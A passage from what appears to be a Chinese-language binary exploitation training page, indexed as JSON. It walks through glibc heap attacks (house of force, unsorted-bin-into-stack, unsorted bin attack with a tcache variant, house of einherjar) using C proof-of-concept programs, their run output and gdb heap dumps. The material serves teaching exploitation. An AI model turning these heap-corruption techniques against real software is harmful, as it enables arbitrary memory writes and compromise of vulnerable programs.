\u65f6\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u591f\u63a7\u5236\u8f6c\u79fb\u4e4b\u540e\u5730\u5740\u5904\u7684\u5185\u5b58\u3002</p> <p>\u9996\u5148\u968f\u610f\u5206\u914d\u4e00\u4e2a chunk\uff0c\u6b64\u65f6\u5185\u5b58\u91cc\u5b58\u5728\u4e24\u4e2a chunk\uff0c\u5373 chunk 1 \u548c top chunk\uff1a</p> <pre><code>gef\u27a4  x/8gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0x0000000000020fe1  &lt;-- top chunk\n0x602030:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>chunk 1 \u771f\u5b9e\u53ef\u7528\u7684\u5185\u5b58\u6709 0x18 \u5b57\u8282\u3002</p> <p>\u5047\u8bbe chunk 1 \u5b58\u5728\u6ea2\u51fa\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u6211\u4eec\u73b0\u5728\u5c06 top chunk \u7684 size \u503c\u6539\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6570\uff1a</p> <pre><code>gef\u27a4  x/8gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk 1\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0xffffffffffffffff  &lt;-- modified top chunk\n0x602030:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u6539\u5199\u4e4b\u540e\u7684 size==0xffffffff\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5 malloc \u4e00\u4e2a\u4efb\u610f\u5927\u5c0f\u7684\u5185\u5b58\u800c\u4e0d\u7528\u8c03\u7528 mmap \u4e86\u3002\u63a5\u4e0b\u6765 malloc \u4e00\u4e2a chunk\uff0c\u4f7f\u5f97\u8be5 chunk \u521a\u597d\u5206\u914d\u5230\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u90a3\u5757\u533a\u57df\u4e3a\u6b62\uff0c\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21 malloc \u65f6\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u5230\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u533a\u57df\u4e86\u3002\u8ba1\u7b97\u65b9\u6cd5\u662f\u7528\u76ee\u6807\u5730\u5740\u51cf\u53bb top chunk \u5730\u5740\uff0c\u518d\u51cf\u53bb chunk \u5934\u7684\u5927\u5c0f\u3002</p> <pre><code>gef\u27a4  x/8gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000021\n0x602010:    0x4141414141414141    0x4141414141414141\n0x602020:    0x4141414141414141    0xfffffffffffff051\n0x602030:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/12gx 0x602010+0xfffffffffffff050\n0x601060:    0x4141414141414141    0x4141414141414141\n0x601070:    0x4141414141414141    0x0000000000000fa9  &lt;-- top chunk\n0x601080 &lt;bss_var&gt;:    0x2073692073696854    0x676e697274732061  &lt;-- target\n0x601090 &lt;bss_var+16&gt;:    0x6577207461687420    0x6f7420746e617720\n0x6010a0 &lt;bss_var+32&gt;:    0x6972777265766f20    0x00000000002e6574\n0x6010b0:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u518d\u6b21 malloc\uff0c\u5c06\u76ee\u6807\u5730\u5740\u5305\u542b\u8fdb\u6765\u5373\u53ef\uff0c\u73b0\u5728\u6211\u4eec\u5c31\u6210\u529f\u63a7\u5236\u4e86\u76ee\u6807\u5185\u5b58\uff1a</p> <pre><code>gef\u27a4  x/12gx 0x602010+0xfffffffffffff050\n0x601060:    0x4141414141414141    0x4141414141414141\n0x601070:    0x4141414141414141    0x0000000000000041  &lt;-- chunk 2\n0x601080 &lt;bss_var&gt;:    0x2073692073696854    0x676e697274732061  &lt;-- target\n0x601090 &lt;bss_var+16&gt;:    0x6577207461687420    0x6f7420746e617720\n0x6010a0 &lt;bss_var+32&gt;:    0x6972777265766f20    0x00000000002e6574\n0x6010b0:    0x0000000000000000    0x0000000000000f69  &lt;-- top chunk\n</code></pre> <p>\u8be5\u6280\u672f\u7684\u7f3a\u70b9\u662f\u4f1a\u53d7\u5230 ASLR \u7684\u5f71\u54cd\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u9700\u8981\u4fee\u6539\u6307\u5b9a\u4f4d\u7f6e\u7684\u5185\u5b58\uff0c\u4ed6\u9996\u5148\u9700\u8981\u77e5\u9053\u5f53\u524d top chunk \u7684\u4f4d\u7f6e\u4ee5\u6784\u9020\u5408\u9002\u7684 malloc \u5927\u5c0f\u6765\u8f6c\u79fb top chunk\u3002\u800c ASLR \u5c06\u4f7f\u5806\u5185\u5b58\u5730\u5740\u968f\u673a\uff0c\u6240\u4ee5\u8be5\u6280\u672f\u8fd8\u9700\u540c\u65f6\u914d\u5408\u4f7f\u7528\u4fe1\u606f\u6cc4\u6f0f\u4ee5\u8fbe\u6210\u653b\u51fb\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#unsorted_bin_into_stack","title":"unsorted_bin_into_stack","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    unsigned long stack_buf[4] = {0};\n\n    unsigned long *victim  = malloc(0x80);\n    unsigned long *p1 = malloc(0x10);\n    fprintf(stderr, \"Allocating the victim chunk at %p\\n\", victim);\n\n    // deal with tcache\n    // int *k[10], i;\n    // for (i = 0; i &lt; 7; i++) {\n    //     k[i] = malloc(0x80);\n    // }\n    // for (i = 0; i &lt; 7; i++) {\n    //     free(k[i]);\n    // }\n\n    free(victim);\n    fprintf(stderr, \"Freeing the chunk, it will be inserted in the unsorted bin\\n\\n\");\n\n    stack_buf[1] = 0x100 + 0x10;\n    stack_buf[3] = (unsigned long)stack_buf;        // or any other writable address\n    fprintf(stderr, \"Create a fake chunk on the stack\\n\");\n    fprintf(stderr, \"fake-&gt;size: %p\\n\", (void *)stack_buf[1]);\n    fprintf(stderr, \"fake-&gt;bk: %p\\n\\n\", (void *)stack_buf[3]);\n\n    victim[1] = (unsigned long)stack_buf;\n    fprintf(stderr, \"Now we overwrite the victim-&gt;bk pointer to stack: %p\\n\\n\", stack_buf);\n\n    fprintf(stderr, \"Malloc a chunk which size is 0x110 will return the region of our fake chunk: %p\\n\", &amp;stack_buf[2]);\n\n    unsigned long *fake = malloc(0x100);\n    fprintf(stderr, \"malloc(0x100): %p\\n\", fake);\n}\n$ gcc -g unsorted_bin_into_stack.c\n$ ./a.out\nAllocating the victim chunk at 0x17a1010\nFreeing the chunk, it will be inserted in the unsorted bin\n\nCreate a fake chunk on the stack\nfake-&gt;size: 0x110\nfake-&gt;bk: 0x7fffcd906480\n\nNow we overwrite the victim-&gt;bk pointer to stack: 0x7fffcd906480\n\nMalloc a chunk which size is 0x110 will return the region of our fake chunk: 0x7fffcd906490\nmalloc(0x100): 0x7fffcd906490\n</code></pre> <p>unsorted-bin-into-stack \u901a\u8fc7\u6539\u5199 unsorted bin \u91cc chunk \u7684 bk \u6307\u9488\u5230\u4efb\u610f\u5730\u5740\uff0c\u4ece\u800c\u5728\u6808\u4e0a malloc \u51fa chunk\u3002</p> <p>\u9996\u5148\u5c06\u4e00\u4e2a chunk \u653e\u5165 unsorted bin\uff0c\u5e76\u4e14\u5728\u6808\u4e0a\u4f2a\u9020\u4e00\u4e2a chunk\uff1a</p> <pre><code>gdb-peda$ x/6gx victim - 2\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk\n0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78\n0x602020:    0x0000000000000000    0x0000000000000000\ngdb-peda$ x/4gx stack_buf\n0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  &lt;-- fake chunk\n0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0\n</code></pre> <p>\u7136\u540e\u5047\u8bbe\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 victim chunk \u7684 bk \u6307\u9488\uff0c\u90a3\u4e48\u5c06\u5176\u6539\u4e3a\u6307\u5411 fake chunk\uff1a</p> <pre><code>gdb-peda$ x/6gx victim - 2\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk\n0x602010:    0x00007ffff7dd1b78    0x00007fffffffdbc0    &lt;-- bk pointer\n0x602020:    0x0000000000000000    0x0000000000000000\ngdb-peda$ x/4gx stack_buf\n0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  &lt;-- fake chunk\n0x7fffffffdbd0:    0x0000000000000000    0x00007fffffffdbc0\n</code></pre> <p>\u90a3\u4e48\u6b64\u65f6\u5c31\u76f8\u5f53\u4e8e fake chunk \u5df2\u7ecf\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\u3002\u5728\u4e0b\u4e00\u6b21 malloc \u7684\u65f6\u5019\uff0cmalloc \u4f1a\u987a\u7740 bk \u6307\u9488\u8fdb\u884c\u904d\u5386\uff0c\u4e8e\u662f\u5c31\u627e\u5230\u4e86\u5927\u5c0f\u6b63\u597d\u5408\u9002\u7684 fake chunk\uff1a</p> <pre><code>gdb-peda$ x/6gx victim - 2\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk\n0x602010:    0x00007ffff7dd1bf8    0x00007ffff7dd1bf8\n0x602020:    0x0000000000000000    0x0000000000000000\ngdb-peda$ x/4gx fake - 2\n0x7fffffffdbc0:    0x0000000000000000    0x0000000000000110  &lt;-- fake chunk\n0x7fffffffdbd0:    0x00007ffff7dd1b78    0x00007fffffffdbc0\n</code></pre> <p>fake chunk \u88ab\u53d6\u51fa\uff0c\u800c victim chunk \u88ab\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u653e\u5230\u4e86 small bin \u4e2d\u3002\u53e6\u5916\u503c\u5f97\u6ce8\u610f\u7684\u662f fake chunk \u7684 fd \u6307\u9488\u88ab\u4fee\u6539\u4e86\uff0c\u8fd9\u662f unsorted bin \u7684\u5730\u5740\uff0c\u901a\u8fc7\u5b83\u53ef\u4ee5\u6cc4\u9732 libc \u5730\u5740\uff0c\u8fd9\u6b63\u662f\u4e0b\u9762 unsorted bin attack \u4f1a\u8bb2\u5230\u7684\u3002</p> <p>\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u89e3\u9664\u6ce8\u91ca\uff0c\u5c31\u662f libc-2.27 \u73af\u5883\u4e0b\u7684\u7248\u672c\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e tcache \u7684\u5f71\u54cd\uff0c<code>stack_buf[3]</code> \u4e0d\u80fd\u518d\u8bbe\u7f6e\u6210\u4efb\u610f\u5730\u5740\u3002</p> <p>malloc \u524d\uff1a</p> <pre><code>gdb-peda$ x/6gx victim - 2\n0x555555756250: 0x0000000000000000      0x0000000000000091  &lt;-- victim chunk\n0x555555756260: 0x00007ffff7dd2b00      0x00007fffffffdcb0\n0x555555756270: 0x0000000000000000      0x0000000000000000\ngdb-peda$ x/4gx stack_buf\n0x7fffffffdcb0: 0x0000000000000000      0x0000000000000110  &lt;-- fake chunk\n0x7fffffffdcc0: 0x0000000000000000      0x00007fffffffdcb0\ngdb-peda$ x/26gx 0x0000555555756000+0x10\n0x555555756010: 0x0700000000000000      0x0000000000000000  &lt;-- counts\n0x555555756020: 0x0000000000000000      0x0000000000000000\n0x555555756030: 0x0000000000000000      0x0000000000000000\n0x555555756040: 0x0000000000000000      0x0000000000000000\n0x555555756050: 0x0000000000000000      0x0000000000000000\n0x555555756060: 0x0000000000000000      0x0000000000000000\n0x555555756070: 0x0000000000000000      0x0000000000000000\n0x555555756080: 0x0000000000000000      0x0000555555756670  &lt;-- entries\n0x555555756090: 0x0000000000000000      0x0000000000000000\n0x5555557560a0: 0x0000000000000000      0x0000000000000000\n0x5555557560b0: 0x0000000000000000      0x0000000000000000\n0x5555557560c0: 0x0000000000000000      0x0000000000000000\n0x5555557560d0: 0x0000000000000000      0x0000000000000000\n</code></pre> <p>malloc \u540e\uff1a</p> <pre><code>gdb-peda$ x/6gx victim - 2\n0x555555756250: 0x0000000000000000      0x0000000000000091  &lt;-- victim chunk\n0x555555756260: 0x00007ffff7dd2b80      0x00007ffff7dd2b80\n0x555555756270: 0x0000000000000000      0x0000000000000000\ngdb-peda$ x/4gx fake - 2\n0x7fffffffdcb0: 0x0000000000000000      0x0000000000000110  &lt;-- fake chunk\n0x7fffffffdcc0: 0x00007ffff7dd2b00      0x00007fffffffdcb0\ngdb-peda$ x/26gx 0x0000555555756000+0x10\n0x555555756010: 0x0700000000000000      0x0700000000000000  &lt;-- counts  &lt;-- counts\n0x555555756020: 0x0000000000000000      0x0000000000000000\n0x555555756030: 0x0000000000000000      0x0000000000000000\n0x555555756040: 0x0000000000000000      0x0000000000000000\n0x555555756050: 0x0000000000000000      0x0000000000000000\n0x555555756060: 0x0000000000000000      0x0000000000000000\n0x555555756070: 0x0000000000000000      0x0000000000000000\n0x555555756080: 0x0000000000000000      0x0000555555756670  &lt;-- entries\n0x555555756090: 0x0000000000000000      0x0000000000000000\n0x5555557560a0: 0x0000000000000000      0x0000000000000000\n0x5555557560b0: 0x0000000000000000      0x0000000000000000\n0x5555557560c0: 0x0000000000000000      0x00007fffffffdcc0  &lt;-- entries\n0x5555557560d0: 0x0000000000000000      0x0000000000000000\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5728 malloc \u65f6\uff0cfake chunk \u88ab\u4e0d\u65ad\u91cd\u590d\u5730\u94fe\u63a5\u5230 tcache bin\uff0c\u76f4\u5230\u88c5\u6ee1\u540e\uff0c\u624d\u4ece unsorted bin \u91cc\u53d6\u51fa\u3002\u540c\u6837\u7684\uff0cfake chunk \u7684 fd \u6307\u5411 unsorted bin\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#unsorted_bin_attack","title":"unsorted_bin_attack","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    unsigned long stack_var = 0;\n    fprintf(stderr, \"The target we want to rewrite on stack: %p -&gt; %ld\\n\\n\", &amp;stack_var, stack_var);\n\n    unsigned long *p  = malloc(0x80);\n    unsigned long *p1 = malloc(0x10);\n    fprintf(stderr, \"Now, we allocate first small chunk on the heap at: %p\\n\",p);\n\n    free(p);\n    fprintf(stderr, \"We free the first chunk now. Its bk pointer point to %p\\n\", (void*)p[1]);\n\n    p[1] = (unsigned long)(&amp;stack_var - 2);\n    fprintf(stderr, \"We write it with the target address-0x10: %p\\n\\n\", (void*)p[1]);\n\n    malloc(0x80);\n    fprintf(stderr, \"Let's malloc again to get the chunk we just free: %p -&gt; %p\\n\", &amp;stack_var, (void*)stack_var);\n}\n$ gcc -g unsorted_bin_attack.c\n$ ./a.out\nThe target we want to rewrite on stack: 0x7ffc9b1d61b0 -&gt; 0\n\nNow, we allocate first small chunk on the heap at: 0x1066010\nWe free the first chunk now. Its bk pointer point to 0x7f2404cf5b78\nWe write it with the target address-0x10: 0x7ffc9b1d61a0\n\nLet's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -&gt; 0x7f2404cf5b78\n</code></pre> <p>unsorted bin \u653b\u51fb\u901a\u5e38\u662f\u4e3a\u66f4\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u505a\u51c6\u5907\u7684\uff0c\u6211\u4eec\u77e5\u9053 unsorted bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5728\u5206\u914d\u65f6\u4f1a\u901a\u8fc7 unlink \u64cd\u4f5c\u5c06 chunk \u4ece\u94fe\u8868\u4e2d\u79fb\u9664\uff0c\u6240\u4ee5\u5982\u679c\u80fd\u591f\u63a7\u5236 unsorted bin chunk \u7684 bk \u6307\u9488\uff0c\u5c31\u53ef\u4ee5\u5411\u4efb\u610f\u4f4d\u7f6e\u5199\u5165\u4e00\u4e2a\u6307\u9488\u3002\u8fd9\u91cc\u901a\u8fc7 unlink \u5c06 libc \u7684\u4fe1\u606f\u5199\u5165\u5230\u6211\u4eec\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\uff0c\u4ece\u800c\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u63d0\u4f9b\u4fbf\u5229\u3002</p> <p>unlink \u7684\u5bf9 unsorted bin \u7684\u64cd\u4f5c\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>          /* remove from unsorted list */\n          unsorted_chunks (av)-&gt;bk = bck;\n          bck-&gt;fd = unsorted_chunks (av);\n</code></pre> <p>\u5176\u4e2d <code>bck = victim-&gt;bk</code>\u3002</p> <p>\u9996\u5148\u5206\u914d\u4e24\u4e2a chunk\uff0c\u7136\u540e\u91ca\u653e\u6389\u7b2c\u4e00\u4e2a\uff0c\u5b83\u5c06\u88ab\u52a0\u5165\u5230 unsorted bin \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/26gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 1 [be freed]\n0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x602020:    0x0000000000000000    0x0000000000000000\n0x602030:    0x0000000000000000    0x0000000000000000\n0x602040:    0x0000000000000000    0x0000000000000000\n0x602050:    0x0000000000000000    0x0000000000000000\n0x602060:    0x0000000000000000    0x0000000000000000\n0x602070:    0x0000000000000000    0x0000000000000000\n0x602080:    0x0000000000000000    0x0000000000000000\n0x602090:    0x0000000000000090    0x0000000000000020  &lt;-- chunk 2\n0x6020a0:    0x0000000000000000    0x0000000000000000\n0x6020b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk\n0x6020c0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/4gx &amp;stack_var-2\n0x7fffffffdc50:    0x00007fffffffdd60    0x0000000000400712\n0x7fffffffdc60:    0x0000000000000000    0x0000000000602010\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n</code></pre> <p>\u7136\u540e\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u4fee\u6539 chunk 1 \u7684\u6570\u636e\u3002\u7136\u540e\u6211\u4eec\u5c06 chunk 1 \u7684 bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5411\u76ee\u6807\u5730\u5740 - 2\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u662f\u5728\u76ee\u6807\u5730\u5740\u5904\u6709\u4e00\u4e2a fake free chunk\uff0c\u7136\u540e malloc\uff1a</p> <pre><code>gef\u27a4  x/26gx 0x602010-0x10\n0x602000:    0x0000000000000000    0x0000000000000091  &lt;-- chunk 3\n0x602010:    0x00007ffff7dd1b78    0x00007fffffffdc50\n0x602020:    0x0000000000000000    0x0000000000000000\n0x602030:    0x0000000000000000    0x0000000000000000\n0x602040:    0x0000000000000000    0x0000000000000000\n0x602050:    0x0000000000000000    0x0000000000000000\n0x602060:    0x0000000000000000    0x0000000000000000\n0x602070:    0x0000000000000000    0x0000000000000000\n0x602080:    0x0000000000000000    0x0000000000000000\n0x602090:    0x0000000000000090    0x0000000000000021  &lt;-- chunk 2\n0x6020a0:    0x0000000000000000    0x0000000000000000\n0x6020b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk\n0x6020c0:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/4gx &amp;stack_var-2\n0x7fffffffdc50:    0x00007fffffffdc80    0x0000000000400756  &lt;-- fake chunk\n0x7fffffffdc60:    0x00007ffff7dd1b78    0x0000000000602010      &lt;-- fd-&gt;TAIL\n</code></pre> <p>\u4ece\u800c\u6cc4\u6f0f\u4e86 unsorted bin \u7684\u5934\u90e8\u5730\u5740\u3002</p> <p>\u90a3\u4e48\u7ee7\u7eed\u6765\u770b libc-2.27 \u91cc\u600e\u4e48\u5904\u7406\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    unsigned long stack_var = 0;\n    fprintf(stderr, \"The target we want to rewrite on stack: %p -&gt; %ld\\n\\n\", &amp;stack_var, stack_var);\n\n    unsigned long *p = malloc(0x80);\n    unsigned long *p1 = malloc(0x10);\n    fprintf(stderr, \"Now, we allocate first small chunk on the heap at: %p\\n\",p);\n\n    free(p);\n    fprintf(stderr, \"Freed the first chunk to put it in a tcache bin\\n\");\n\n    p[0] = (unsigned long)(&amp;stack_var);\n    fprintf(stderr, \"Overwrite the next ptr with the target address\\n\");\n    malloc(0x80);\n    malloc(0x80);\n    fprintf(stderr, \"Now we malloc twice to make tcache struct's counts '0xff'\\n\\n\");\n\n    free(p);\n    fprintf(stderr, \"Now free again to put it in unsorted bin\\n\");\n    p[1] = (unsigned long)(&amp;stack_var - 2);\n    fprintf(stderr, \"Now write its bk ptr with the target address-0x10: %p\\n\\n\", (void*)p[1]);\n\n    malloc(0x80);\n    fprintf(stderr, \"Finally malloc again to get the chunk at target address: %p -&gt; %p\\n\", &amp;stack_var, (void*)stack_var);\n}\n$ gcc -g tcache_unsorted_bin_attack.c\n$ ./a.out\nThe target we want to rewrite on stack: 0x7ffef0884c10 -&gt; 0\n\nNow, we allocate first small chunk on the heap at: 0x564866907260\nFreed the first chunk to put it in a tcache bin\nOverwrite the next ptr with the target address\nNow we malloc twice to make tcache struct's counts '0xff'\n\nNow free again to put it in unsorted bin\nNow write its bk ptr with the target address-0x10: 0x7ffef0884c00\n\nFinally malloc again to get the chunk at target address: 0x7ffef0884c10 -&gt; 0x7f69ba1d8ca0\n</code></pre> <p>\u6211\u4eec\u77e5\u9053\u7531\u4e8e tcache \u7684\u5b58\u5728\uff0cmalloc \u4ece unsorted bin \u53d6 chunk \u7684\u65f6\u5019\uff0c\u5982\u679c\u5bf9\u5e94\u7684 tcache bin \u8fd8\u672a\u88c5\u6ee1\uff0c\u5219\u4f1a\u5c06 unsorted bin \u91cc\u7684 chunk \u5168\u90e8\u653e\u8fdb\u5bf9\u5e94\u7684 tcache bin\uff0c\u7136\u540e\u518d\u4ece tcache bin \u4e2d\u53d6\u51fa\u3002\u90a3\u4e48\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u5728\u653e\u8fdb tcache bin \u7684\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0cmalloc \u4f1a\u4ee5\u4e3a\u6211\u4eec\u7684 target address \u4e5f\u662f\u4e00\u4e2a chunk\uff0c\u7136\u800c\u8fd9\u4e2a \"chunk\" \u662f\u8fc7\u4e0d\u4e86\u68c0\u67e5\u7684\uff0c\u5c06\u629b\u51fa \"memory corruption\" \u7684\u9519\u8bef\uff1a</p> <pre><code>      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))\n        {\n          bck = victim-&gt;bk;\n          if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)\n              || __builtin_expect (chunksize_nomask (victim)\n                   &gt; av-&gt;system_mem, 0))\n            malloc_printerr (\"malloc(): memory corruption\");\n</code></pre> <p>\u90a3\u4e48\u8981\u60f3\u8df3\u8fc7\u653e chunk \u7684\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5c31\u9700\u8981\u5bf9\u5e94 tcache bin \u7684 counts \u57df\u4e0d\u5c0f\u4e8e tcache_count\uff08\u9ed8\u8ba4\u4e3a7\uff09\uff0c\u4f46\u5982\u679c counts \u4e0d\u4e3a 0\uff0c\u8bf4\u660e tcache bin \u91cc\u662f\u6709 chunk \u7684\uff0c\u90a3\u4e48 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4ece tcache bin \u91cc\u53d6\u51fa\uff0c\u4e8e\u662f\u5c31\u6ca1\u6709 unsorted bin \u4ec0\u4e48\u4e8b\u4e86\uff1a</p> <pre><code>  if (tc_idx &lt; mp_.tcache_bins\n      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */\n      &amp;&amp; tcache\n      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)\n    {\n      return tcache_get (tc_idx);\n    }\n</code></pre> <p>\u8fd9\u5c31\u9020\u6210\u4e86\u77db\u76fe\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u79cd\u65e2\u80fd\u4ece unsorted bin \u4e2d\u53d6 chunk\uff0c\u53c8\u4e0d\u4f1a\u5c06 chunk \u653e\u8fdb tcache bin \u7684\u529e\u6cd5\u3002</p> <p>\u4e8e\u662f\u5c31\u5f97\u5230\u4e86\u4e0a\u9762\u7684\u5229\u7528 tcache poisoning\uff08\u53c2\u8003\u7ae0\u82824.14\uff09\uff0c\u5c06 counts \u4fee\u6539\u6210\u4e86 <code>0xff</code>\uff0c\u4e8e\u662f\u5728\u8fdb\u884c\u5230\u4e0b\u9762\u8fd9\u91cc\u65f6\u5c31\u4f1a\u8fdb\u5165 else \u5206\u652f\uff0c\u76f4\u63a5\u53d6\u51fa chunk \u5e76\u8fd4\u56de\uff1a</p> <pre><code>#if USE_TCACHE\n          /* Fill cache first, return to user only if cache fills.\n         We may return one of these chunks later.  */\n          if (tcache_nb\n          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)\n        {\n          tcache_put (victim, tc_idx);\n          return_cached = 1;\n          continue;\n        }\n          else\n        {\n#endif\n              check_malloced_chunk (av, victim, nb);\n              void *p = chunk2mem (victim);\n              alloc_perturb (p, bytes);\n              return p;\n</code></pre> <p>\u4e8e\u662f\u5c31\u6210\u529f\u6cc4\u9732\u51fa\u4e86 unsorted bin \u7684\u5934\u90e8\u5730\u5740\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#house_of_einherjar","title":"house_of_einherjar","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;malloc.h&gt;\n\nint main() {\n    uint8_t *a, *b, *d;\n\n    a = (uint8_t*) malloc(0x10);\n    int real_a_size = malloc_usable_size(a);\n    memset(a, 'A', real_a_size);\n    fprintf(stderr, \"We allocate 0x10 bytes for 'a': %p\\n\\n\", a);\n\n    size_t fake_chunk[6];\n    fake_chunk[0] = 0x80;\n    fake_chunk[1] = 0x80;\n    fake_chunk[2] = (size_t) fake_chunk;\n    fake_chunk[3] = (size_t) fake_chunk;\n    fake_chunk[4] = (size_t) fake_chunk;\n    fake_chunk[5] = (size_t) fake_chunk;\n    fprintf(stderr, \"Our fake chunk at %p looks like:\\n\", fake_chunk);\n    fprintf(stderr, \"prev_size: %#lx\\n\", fake_chunk[0]);\n    fprintf(stderr, \"size: %#lx\\n\", fake_chunk[1]);\n    fprintf(stderr, \"fwd: %#lx\\n\", fake_chunk[2]);\n    fprintf(stderr, \"bck: %#lx\\n\", fake_chunk[3]);\n    fprintf(stderr, \"fwd_nextsize: %#lx\\n\", fake_chunk[4]);\n    fprintf(stderr, \"bck_nextsize: %#lx\\n\\n\", fake_chunk[5]);\n\n    b = (uint8_t*) malloc(0xf8);\n    int real_b_size = malloc_usable_size(b);\n    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);\n    fprintf(stderr, \"We allocate 0xf8 bytes for 'b': %p\\n\", b);\n    fprintf(stderr, \"b.size: %#lx\\n\", *b_size_ptr);\n    fprintf(stderr, \"We overflow 'a' with a single null byte into the metadata of 'b'\\n\");\n    a[real_a_size] = 0;\n    fprintf(stderr, \"b.size: %#lx\\n\\n\", *b_size_ptr);\n\n    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\n    *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\n    fprintf(stderr, \"We write a fake prev_size to the last %lu bytes of a so that it will consolidate with our fake chunk\\n\", sizeof(size_t));\n    fprintf(stderr, \"Our fake prev_size will be %p - %p = %#lx\\n\\n\", b-sizeof(size_t)*2, fake_chunk, fake_size);\n\n    fake_chunk[1] = fake_size;\n    fprintf(stderr, \"Modify fake chunk's size to reflect b's new prev_size\\n\");\n\n    fprintf(stderr, \"Now we free b and this will consolidate with our fake chunk\\n\");\n    free(b);\n    fprintf(stderr, \"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\", fake_chunk[1]);\n\n    d = malloc(0x10);\n    memset(d, 'A', 0x10);\n    fprintf(stderr, \"\\nNow we can call malloc() and it will begin in our fake chunk: %p\\n\", d);\n}\n$ gcc -g house_of_einherjar.c\n$ ./a.out\nWe allocate 0x10 bytes for 'a': 0xb31010\n\nOur fake chunk at 0x7ffdb337b7f0 looks like:\nprev_size: 0x80\nsize: 0x80\nfwd: 0x7ffdb337b7f0\nbck: 0x7ffdb337b7f0\nfwd_nextsize: 0x7ffdb337b7f0\nbck_nextsize: 0x7ffdb337b7f0\n\nWe allocate 0xf8 bytes for 'b': 0xb31030\nb.size: 0x101\nWe overflow 'a' with a single null byte into the metadata of 'b'\nb.size: 0x100\n\nWe write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk\nOur fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830\n\nModify fake chunk's size to reflect b's new prev_size\nNow we free b and this will consolidate with our fake chunk\nOur fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size)\n\nNow we can call malloc() and it will begin 